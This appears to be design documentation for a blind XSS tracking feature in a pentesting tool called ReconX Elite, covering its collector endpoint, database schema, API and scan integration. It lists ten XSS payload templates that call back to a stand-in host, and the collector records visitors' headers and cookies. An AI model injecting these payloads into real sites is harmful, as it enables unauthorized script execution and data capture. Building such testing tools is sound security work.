# Blind XSS and Interaction Tracking System

## Overview

The Blind XSS and Interaction Tracking system in ReconX Elite provides comprehensive monitoring for out-of-band XSS vulnerabilities. This feature automatically generates unique tracking tokens, injects them into payloads during security testing, and captures detailed interaction data when payloads are triggered.

## Features

### 1. Unique Token Generation

- Generates cryptographically secure 32-character tokens
- Tokens are unique per user and payload opportunity
- Format: `https://yourdomain.com/xss/{token}`

### 2. Collector Endpoint

The system provides a public collector endpoint that captures:

- **IP Address**: Source IP of the triggering request
- **User Agent**: Browser/client identification
- **Headers**: Complete HTTP headers (including cookies if present)
- **Request Method**: HTTP method used
- **URL Path**: The path where the payload was triggered
- **Referrer**: HTTP referrer header
- **Raw Request Body**: For POST/PUT/PATCH requests

### 3. Payload Integration

Blind XSS payloads are automatically integrated into:

- **Form parameters**: Input fields, textareas, hidden fields
- **Query parameters**: URL parameters
- **Integration points**: Seamlessly added to existing XSS testing workflows

### 4. User Notifications

- Real-time notifications when blind XSS payloads are triggered
- Integration with ReconX Elite's notification system
- Alerts include payload context and triggering details

### 5. Frontend Dashboard

- **Blind Hits Panel**: Dedicated tab showing all captured interactions
- **Hit Details**: Complete information about each triggered payload
- **Status Management**: Mark hits as processed or ignored
- **Context Linking**: Connect hits back to original scan endpoints

## Technical Implementation

### Database Schema

#### blind_xss_hits Table

```sql
CREATE TABLE blind_xss_hits (
    id SERIAL PRIMARY KEY,
    user_id INTEGER REFERENCES users(id) ON DELETE CASCADE,
    token VARCHAR(64) UNIQUE NOT NULL,
    payload_opportunity_id INTEGER REFERENCES payload_opportunities(id) ON DELETE SET NULL,
    ip_address VARCHAR(45) NOT NULL,  -- IPv4/IPv6 support
    user_agent TEXT,
    headers_json JSON DEFAULT '{}',
    cookies_json JSON DEFAULT '{}',
    raw_request TEXT,
    referrer VARCHAR(2048),
    url_path VARCHAR(2048),
    method VARCHAR(8) DEFAULT 'GET',
    triggered_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    processed INTEGER DEFAULT 0  -- 0=unprocessed, 1=processed, 2=ignored
);
```

### API Endpoints

#### Collector Endpoint (Public)

```
GET/POST/PUT/DELETE/PATCH/HEAD/OPTIONS /xss/{token}
```

- **Purpose**: Captures blind XSS interactions
- **Authentication**: None (public endpoint)
- **Response**: 1x1 transparent GIF or 404 for invalid tokens

#### Management Endpoints (Authenticated)

```
GET /payloads/blind-xss/hits
POST /payloads/blind-xss/tokens
PUT /payloads/blind-xss/hits/{hit_id}/processed
```

### Payload Generation

#### Blind XSS Payload Templates

```javascript
// Image-based callback
'<img src=x onerror="fetch(\'https://yourdomain.com/xss/__TOKEN__\')">';

// Script-based callback
'<script>fetch("https://yourdomain.com/xss/__TOKEN__")</script>';

// SVG onload callback
'<svg onload="fetch(\'https://yourdomain.com/xss/__TOKEN__\')">';

// Iframe callback
'<iframe src="javascript:fetch(\'https://yourdomain.com/xss/__TOKEN__\')"></iframe>';

// Form submission callback
'<form action="https://yourdomain.com/xss/__TOKEN__" method="POST"><input type="submit"></form>';

// Link click callback
'<a href="javascript:fetch(\'https://yourdomain.com/xss/__TOKEN__\')">click</a>';

// Body onload callback
'<body onload="fetch(\'https://yourdomain.com/xss/__TOKEN__\')">';

// Input focus callback
'<input onfocus="fetch(\'https://yourdomain.com/xss/__TOKEN__\')" autofocus>';

// Details toggle callback
'<details ontoggle="fetch(\'https://yourdomain.com/xss/__TOKEN__\')" open>';

// Marquee start callback
'<marquee onstart="fetch(\'https://yourdomain.com/xss/__TOKEN__\')">';
```

### Integration Points

#### Scan Pipeline Integration

Blind XSS opportunities are detected during the scan pipeline:

1. **Parameter Analysis**: Identifies text input parameters suitable for XSS
2. **Token Generation**: Creates unique tokens for each opportunity
3. **Payload Creation**: Generates payloads with embedded tokens
4. **Storage**: Links tokens to payload opportunities for context

#### Notification System

When a blind XSS hit is captured:

1. **Database Record**: Hit details are stored
2. **Notification Creation**: User receives real-time alert
3. **Context Preservation**: Links back to original scan and endpoint

## Usage Workflow

### 1. Automatic Detection

During security scans, ReconX Elite automatically:

- Identifies parameters vulnerable to XSS
- Generates unique tracking tokens
- Creates blind XSS payloads with embedded tokens
- Stores payload opportunities with token references

### 2. Payload Deployment

Blind XSS payloads are included in:

- Automated security testing
- Manual payload testing
- Form submissions and parameter injections

### 3. Interaction Capture

When payloads are triggered:

- Collector endpoint receives the callback
- Complete request details are captured
- Database record is created
- User notification is sent

### 4. Analysis and Response

Users can:

- View all captured hits in the Blind XSS dashboard
- Analyze triggering context and details
- Mark hits as processed or ignored
- Link hits back to original vulnerabilities

## Security Considerations

### Token Security

- Tokens are cryptographically secure (32 hex characters)
- Tokens are unique per user and opportunity
- Invalid tokens return 404 responses

### Data Handling

- All captured data is associated with authenticated users
- Sensitive information is properly sanitized
- Raw request bodies are limited and truncated if necessary

### Rate Limiting

- Collector endpoints include rate limiting
- Prevents abuse and resource exhaustion
- Maintains system performance

## Frontend Components

### BlindHitsPanel Component

```jsx
// Displays all blind XSS hits for the current user
// Provides filtering, sorting, and status management
// Links hits to original payload opportunities
```

### Integration with TargetPage

- Added "Blind XSS" tab to target detail pages
- Seamless integration with existing UI patterns
- Real-time updates and notifications

## API Response Formats

### Hit Summary Response

```json
{
  "id": 123,
  "token": "a1b2c3d4...",
  "ip_address": "192.168.1.100",
  "user_agent": "Mozilla/5.0...",
  "referrer": "https://example.com/form",
  "url_path": "/xss/a1b2c3d4...",
  "method": "GET",
  "triggered_at": "2024-04-03T10:30:00Z",
  "processed": 0,
  "payload_opportunity": {
    "id": 456,
    "endpoint_url": "https://example.com/contact",
    "parameter_name": "message"
  }
}
```

## Future Enhancements

### Potential Improvements

- **Advanced Payloads**: Support for more complex blind XSS techniques
- **Analytics**: Hit pattern analysis and trending
- **Integration**: Webhook notifications for external systems
- **Filtering**: Advanced filtering and search capabilities
- **Reporting**: Automated report generation for blind XSS findings

### Monitoring Enhancements

- **Geolocation**: IP-based geolocation for hits
- **Browser Fingerprinting**: Enhanced browser and device detection
- **Timing Analysis**: Response time analysis for payload effectiveness
- **Correlation**: Link multiple hits from the same source

## Troubleshooting

### Common Issues

1. **Tokens not generating**: Check database connectivity and user permissions
2. **Hits not capturing**: Verify collector endpoint accessibility
3. **Notifications not sending**: Check notification service configuration
4. **Frontend not loading**: Ensure API endpoints are properly configured

### Debug Information

- Collector endpoint returns debug info: `GET /xss/{token}/info`
- Database logs capture all hit recording attempts
- Frontend console logs show API interaction details

## Configuration

### Environment Variables

```bash
# Blind XSS Configuration
BLIND_XSS_DOMAIN=yourdomain.com  # Domain for callback URLs
BLIND_XSS_RATE_LIMIT=100         # Requests per minute per IP
BLIND_XSS_MAX_HITS=1000          # Maximum hits to store per user
```

### Database Configuration

- Automatic migration creates required tables
- Indexes on frequently queried columns
- Foreign key constraints maintain data integrity

This Blind XSS system provides comprehensive out-of-band vulnerability detection, making ReconX Elite a powerful tool for identifying and tracking XSS vulnerabilities that traditional in-band testing might miss.
